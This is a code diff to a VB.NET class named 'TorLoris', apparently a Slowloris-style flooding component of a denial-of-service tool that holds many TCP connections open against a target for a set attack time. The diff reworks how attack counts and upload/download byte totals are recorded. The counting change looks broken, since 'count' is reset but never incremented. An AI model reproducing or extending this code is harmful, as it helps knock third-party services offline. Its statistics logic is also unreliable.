@@ -89,11 +89,23 @@ Public Class TorLoris
             Dim TCParray As TcpClient() = New TcpClient(100 - 1) {}
             Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
             Dim stopwatch As Stopwatch = Stopwatch.StartNew
-
+            Dim count As Integer = 0
+            Dim UploadLength As Integer = 0
+            Dim DownloadLength As Integer = 0
             Do While (stopwatch.Elapsed < span)
+                'FloodBase
+                GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + count)
+                GetFloodsBase().SetAttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * UploadLength)
+                GetFloodsBase().SetAttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * DownloadLength)
+                count = 0
+                If Config.Variables.Debug Then
+                    Console.WriteLine("Count: " & GetFloodsBase.Get_AttackCount())
+                End If
+
+                'Worker
                 Try
                     Dim i As Integer
-
+                    Dim length As Integer = 0
                     For i = 0 To 100 - 1
                         If RandomFile Then
                             file = GenerateRandomString(5, True)
@@ -120,8 +132,7 @@ Public Class TorLoris
                             stream.Flush()
                         End Using
 
-                        GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + 1)
-                        GetFloodsBase().Set_AttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * headerContent.Length)
+                        UploadLength = headerContent.Length
 
                     Next i
                     Dim j As Integer
@@ -136,7 +147,7 @@ Public Class TorLoris
                             msg = msg + Convert.ToChar(reader.Read()).ToString
                         End While
 
-                        GetFloodsBase().Set_AttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * sb.ToString().Length)
+                        DownloadLength = sb.ToString().Length
                         TCParray(i).Close()
 
                     Next j
